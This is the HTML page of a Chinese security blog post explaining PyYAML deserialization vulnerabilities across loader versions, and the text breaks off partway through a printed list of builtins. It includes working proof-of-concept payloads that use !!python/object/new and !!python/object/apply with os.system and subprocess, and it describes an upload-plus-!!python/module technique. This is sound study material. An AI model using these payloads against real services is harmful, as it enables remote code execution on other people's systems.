@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Python yaml 反序列化 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","font_size":"15px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Python yaml 反序列化</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-06-02 16:29:18</span>
+        <span class="mobile">2023-06-02 16:29</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-06-02 16:38:33</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <p>Python yaml 反序列化</p>
+<span id="more"></span>
+
+<h1 id="Py-Yaml-反序列化漏洞"><a href="#Py-Yaml-反序列化漏洞" class="headerlink" title="Py Yaml 反序列化漏洞"></a>Py Yaml 反序列化漏洞</h1><h2 id="Python-中的强制类型转换"><a href="#Python-中的强制类型转换" class="headerlink" title="Python 中的强制类型转换"></a>Python 中的强制类型转换</h2><ul>
+<li>Py Yaml 的漏洞本质上是因为这一点产生的</li>
+</ul>
+<p>可以通过 <code>!!</code> 来进行类型转换。</p>
+<p>通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：<code>a: !!str 1</code>，它的结果和 <code>a: &quot;1&quot;</code> 是一样的。</p>
+<p>由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 <code>!!</code> 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 <code>!!</code> 上做了哪些魔改。</p>
+
+
+<p>在 <code>site-packages/yaml/constructor.py</code> 中可以看到使用了 <code>add_constructor</code> 的有 24 多个地方，这些都是用来支持基础的类型转换（带有 <code>tag:yaml.org,2002:python/</code> 的说明是 PyYAML 自定义的类型转换）</p>
+
+
+<p>这些基础类型转换的功能非常好理解，看上面那张图即可，就不多说了，我们下面简单写一个 demo</p>
+<p><strong>test.py</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># test.yaml 文件内容  </span>
+<span class="token comment"># str: !!str 3.14     把浮点型3.14强转成str类型  </span>
+<span class="token comment"># int: !!int "123"    把字符串123强转成int类型  </span>
+  
+<span class="token comment"># python 代码  </span>
+<span class="token keyword">import</span> yaml  
+<span class="token keyword">import</span> os  
+  
+<span class="token comment"># 项目路径  </span>
+project_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'tools'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  
+  
+  
+<span class="token keyword">def</span> <span class="token function">get_yaml_data</span><span class="token punctuation">(</span>fileDir<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+   <span class="token triple-quoted-string string">"""  
+   读取 test.yaml 文件内容  
+   :param fileDir:   :return:  
+   """</span>   <span class="token comment"># 1、在内存里加载这个文件  </span>
+   f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fileDir<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  
+   <span class="token comment"># 2、调用yaml读取文件  </span>
+   res <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>  
+   <span class="token keyword">return</span> res  
+  
+  
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  
+   info <span class="token operator">=</span> get_yaml_data<span class="token punctuation">(</span>project_path <span class="token operator">+</span> <span class="token string">r'\test.yaml'</span><span class="token punctuation">)</span>  
+   <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Run test.py</p>
+
+
+<p>我们可以调试代码，简单看一下流程与一些值，传入的参数 node 格式为</p>
+
+
+<p>所以对于一个 <code>!!x x</code> 来说，类型转换执行的伪代码就是：<code>find_function(&quot;x&quot;)(x)</code>。这个也很好理解。</p>
+<h3 id="高级类型转换"><a href="#高级类型转换" class="headerlink" title="高级类型转换"></a>高级类型转换</h3><p>在理解了基础的类型转换之后，查看源码可以发现还有一个 <code>add_multi_constructor</code> 函数，一共有 5 个：</p>
+<ul>
+<li><code>python/name</code></li>
+<li><code>python/module</code></li>
+<li><code>python/object</code></li>
+<li><code>python/object/new</code></li>
+<li><code>python/object/apply</code></li>
+</ul>
+<p>从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。</p>
+<ul>
+<li>用 Pycharm 来安装两个 Py Yaml 版本，先从 Py Yaml &lt; 5.1 的版本说起</li>
+</ul>
+<h2 id="PyYaml-lt-5-1-的序列化与反序列化"><a href="#PyYaml-lt-5-1-的序列化与反序列化" class="headerlink" title="PyYaml &lt; 5.1 的序列化与反序列化"></a>PyYaml &lt; 5.1 的序列化与反序列化</h2><p>在 Python 中的 PyYAML 库中提供这几种方式实现 Python 和 Yaml 这两种语言的转换。</p>
+<p><strong>yaml -&gt; python</strong> 使用的方法是 <code>yaml.dump</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>dump()</code> 方法将 Python 对象 <code>data</code> 转换为 YAML 格式的方法，<code>data</code> 是一个 Python 对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。</p>
+<p>举个例子：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml  
+  
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  
+    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John'</span><span class="token punctuation">,</span>  
+    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span>  
+    <span class="token string">'is_student'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>  
+    <span class="token string">'hobbies'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'reading'</span><span class="token punctuation">,</span> <span class="token string">'swimming'</span><span class="token punctuation">,</span> <span class="token string">'traveling'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
+    <span class="token string">'address'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>  
+        <span class="token string">'street'</span><span class="token punctuation">:</span> <span class="token string">'123 Main St'</span><span class="token punctuation">,</span>  
+        <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token string">'Anytown'</span><span class="token punctuation">,</span>  
+        <span class="token string">'state'</span><span class="token punctuation">:</span> <span class="token string">'CA'</span><span class="token punctuation">,</span>  
+        <span class="token string">'zip'</span><span class="token punctuation">:</span> <span class="token string">'12345'</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+yaml_data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  
+  
+<span class="token keyword">print</span><span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出结果：</p>
+
+
+<p>在这个代码中，我们定义了一个 Python 字典 <code>data</code>，然后使用 <code>yaml.dump</code> 方法将 <code>data</code> 对象转换为 YAML 格式，并将其赋值给变量 <code>yaml_data</code>。最后，我们打印 <code>yaml_data</code>，输出转换后的 YAML 格式数据。</p>
+<p>其实通俗点来说，就是将 Python 的对象实例转化为 YAML 格式的字符串，也就是<strong>序列化</strong>。</p>
+<h3 id="深入挖掘-Py-YAML-序列化与反序列化"><a href="#深入挖掘-Py-YAML-序列化与反序列化" class="headerlink" title="深入挖掘 Py YAML 序列化与反序列化"></a>深入挖掘 Py YAML 序列化与反序列化</h3><ul>
+<li>其实 Py YAML 并不是只有一个 <code>yaml.load()</code> 一个反序列化的方法</li>
+</ul>
+<p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p>
+<ol>
+<li><code>yaml.load</code>：加载单个 YAML 配置</li>
+<li><code>yaml.load_all</code>：加载多个 YAML 配置</li>
+</ol>
+<p>以上这两种均可以通过 <code>Loader</code> 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：</p>
+<ol>
+<li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li>
+<li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li>
+<li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换</li>
+</ol>
+<p><code>Constructor</code> 这个是最危险的构造器，却是默认使用的构造器。</p>
+<p>所有的 <code>construct_python_xxx()</code> 所有方法都调用了 <code>constructor()</code> 方法，这让我想起来 CVE-2018-1284 这个洞，大致上差不多。</p>
+
+
+<p>我们可以先用这个 EXP 调试看一下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml  
+  
+poc <span class="token operator">=</span> <span class="token string">'!!python/object/new:os.system ["calc.exe"]'</span>  
+<span class="token comment">#给出一些相同用法的POC  </span>
+<span class="token comment">#poc = '!!python/object/new:subprocess.check_output [["calc.exe"]]'  </span>
+<span class="token comment">#poc = '!!python/object/new:os.popen ["calc.exe"]'  </span>
+<span class="token comment">#poc = '!!python/object/new:subprocess.run ["calc.exe"]'  </span>
+<span class="token comment">#poc = '!!python/object/new:subprocess.call ["calc.exe"]'  </span>
+<span class="token comment">#poc = '!!python/object/new:subprocess.Popen ["calc.exe"]'  </span>
+  
+yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>到 <code>make_python_instance()</code> 的调用栈如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">make_python_instance<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">552</span>
+construct_python_object_apply<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">606</span>
+construct_python_object_new<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">617</span>
+construct_object<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">88</span>
+construct_document<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">41</span>
+get_single_data<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">37</span>
+load<span class="token punctuation">,</span> __init__<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">72</span>
+<span class="token operator">&lt;</span>module<span class="token operator">></span><span class="token punctuation">,</span> EXP<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>中间的调用栈也很简单，这里不再赘述，直接看漏洞触发点，其实是从 <code>find_python_name()</code> 方法中开始被调用</p>
+
+
+<p>跟进 <code>find_python_name()</code> 方法，里面触发点是在 <code>__import__</code> 上，在 SSTI 里面我们就会用到 <code>__import__</code> 来导入恶意类，从而实现漏洞攻击。</p>
+
+
+<p>利用成功</p>
+
+
+<p><strong>针对!!python&#x2F;module标签</strong></p>
+<p>这个标签对应的是源码中的 <code>construct_python_module</code>，针对这个标签的利用方法和前两个不同，它没有调用逻辑，但是再搭配任意文件上传有奇效。</p>
+<p>首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 <code>exp.py</code>，然后通过 <code>yaml.load(&#39;!!python/module:exp&#39;)</code> 加载。</p>
+<p>在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>py  
+uploads  
+<span class="token operator">|</span>_ user<span class="token punctuation">.</span>png  
+<span class="token operator">|</span>_ header<span class="token punctuation">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 <code>import uploads.header</code> 就可以利用了：</p>
+
+
+<p>接着运行 <code>python3 app.py</code> 即可</p>
+<h2 id="PyYaml-gt-x3D-5-1-的序列化与反序列化"><a href="#PyYaml-gt-x3D-5-1-的序列化与反序列化" class="headerlink" title="PyYaml &gt;&#x3D; 5.1 的序列化与反序列化"></a>PyYaml &gt;&#x3D; 5.1 的序列化与反序列化</h2><p>大部分东西是一样的，区别在于 PyYaml &gt;&#x3D; 5.1 的时候，它并不是以 <code>Constructor</code> 作为默认使用的构造器。所以我们在请求的时候，是需要加上 <code>Loader</code> 这个参数的</p>
+<p>这里说明一下 PyYaml &gt;&#x3D; 5.1 都有哪些加载器</p>
+<pre class="line-numbers language-none"><code class="language-none">BaseLoader：不支持强制类型转换
+SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。
+FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。
+UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>从加载器里面就可以比较明显得看出来，如果要进行漏洞挖掘的话，一定是从下面三个加载器去做文章，其中第二个 <code>SafeLoader</code> 需要我们去找 bypass 的方法，而剩下两个，则是寻找能利用的方法。</li>
+</ul>
+<p>在 PyYaml &gt;&#x3D; 5.1的版本之后，Fullloader 这个加载器对于 payload 的限制比较多了，我们延用PyYaml 的 poc 还是可以的，只不过要修改一下。</p>
+<p>我们还可以利用 python 内置的 builtins 模块(因为之前我们审计 constructor.py 时，发现定义的find_python_name() 中，如果不用”.”将模块名和对象名分开，会默认调用 builtins 模块)</p>
+<h4 id="1-沿用-PyYaml-lt-x3D-5-1-的-poc"><a href="#1-沿用-PyYaml-lt-x3D-5-1-的-poc" class="headerlink" title="1.沿用 PyYaml&lt;&#x3D;5.1 的 poc"></a>1.沿用 PyYaml&lt;&#x3D;5.1 的 poc</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> yaml <span class="token keyword">import</span> <span class="token operator">*</span>
+poc<span class="token operator">=</span> <span class="token triple-quoted-string string">b"""!!python/object/apply:os.system
+- calc"""</span>
+<span class="token comment">#subprocess.check_output</span>
+<span class="token comment">#os.popen</span>
+<span class="token comment">#subprocess.run</span>
+<span class="token comment">#subprocess.call</span>
+<span class="token comment">#subprocess.Popen</span>
+
+yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">,</span>Loader<span class="token operator">=</span>Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h4 id="2-利用-builtins-模块中的内置函数"><a href="#2-利用-builtins-模块中的内置函数" class="headerlink" title="2.利用 builtins 模块中的内置函数"></a>2.利用 builtins 模块中的内置函数</h4><p>首先，我们先明确 builtins 中的所有的类，从而筛选出可以利用的类</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins
+
+builtin_classes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> obj_name <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    obj <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> obj_name<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        builtin_classes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>builtin_classes<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出结果：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ArithmeticError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AssertionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AttributeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseExceptionGroup'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BlockingIOError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BrokenPipeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BufferError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BytesWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ChildProcessError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionAbortedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionRefusedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionResetError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'DeprecationWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EOFError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EncodingWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Exception'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ExceptionGroup'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileExistsError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileNotFoundError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FloatingPointError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FutureWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'GeneratorExit'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndentationError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndexError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'InterruptedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IsADirectoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token 